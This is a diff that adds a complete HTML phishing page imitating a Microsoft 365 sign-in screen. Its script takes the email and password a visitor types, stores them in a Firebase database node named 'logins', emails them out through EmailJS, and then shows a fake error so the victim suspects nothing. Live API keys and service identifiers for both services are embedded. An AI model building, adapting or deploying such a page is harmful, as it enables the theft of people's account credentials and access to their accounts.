@@ -1,0 +1,136 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Secure Login (Offline)</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: url('https://i.ibb.co/60PqgFwC/M365-Apps-1024x837.png') no-repeat center center fixed;
+      background-size: cover;
+      font-family: Arial, sans-serif;
+    }
+
+    .login-box {
+      position: absolute;
+      top: 0;
+      right: 0;
+      width: 50%;
+      height: 50vh;
+      background-color: #1b1f50;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 30px;
+      box-sizing: border-box;
+    }
+
+    .input-box, .submit-button {
+      margin-bottom: 20px;
+    }
+
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+
+    button {
+      padding: 12px;
+      font-size: 16px;
+      background-color: #fcb900;
+      color: #1b1f50;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .error-box {
+      display: none;
+      font-size: 26px;
+      font-weight: bold;
+      background: rgba(255,255,255,0.9);
+      color: darkred;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box" id="loginBox">
+    <div id="formSection">
+      <div class="input-box">
+        <label for="email">Email</label><br />
+        <input type="email" id="email" placeholder="Enter your email" required />
+      </div>
+      <div class="input-box">
+        <label for="password">Password</label><br />
+        <input type="password" id="password" placeholder="Enter your password" required />
+      </div>
+      <div class="submit-button">
+        <button onclick="submitForm()">SUBMIT</button>
+      </div>
+    </div>
+    <div id="errorBox" class="error-box">
+      Whoops something went wrong....!
+    </div>
+  </div>
+
+  <!-- Firebase & EmailJS scripts -->
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
+
+  <script type="text/javascript">
+    // Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyDXgjtJoJO0loDrLiKQLkv9wPS8_G936ok",
+      authDomain: "submission-a85cb.firebaseapp.com",
+      databaseURL: "https://submission-a85cb-default-rtdb.firebaseio.com",
+      projectId: "submission-a85cb",
+      storageBucket: "submission-a85cb.appspot.com",
+      messagingSenderId: "184361239138",
+      appId: "1:184361239138:web:daf23fff2d0235a5e3473b",
+      measurementId: "G-FXH1ELYH5X"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Init EmailJS
+    emailjs.init("CnGrgUQu2Hii4qmJL");
+
+    function submitForm() {
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (email && password) {
+        // Save to Firebase
+        db.ref("logins").push({ email, password });
+
+        // Send with EmailJS
+        emailjs.send("service_umepgqb", "template_dkdbz4m", {
+          user_email: email,
+          user_password: password
+        })
+        .then(() => {
+          document.getElementById("formSection").style.display = "none";
+          document.getElementById("errorBox").style.display = "block";
+        })
+        .catch((error) => {
+          alert("EmailJS Error: " + error.text);
+        });
+      } else {
+        alert("Both fields are required.");
+      }
+    }
+  </script>
+</body>
+</html>
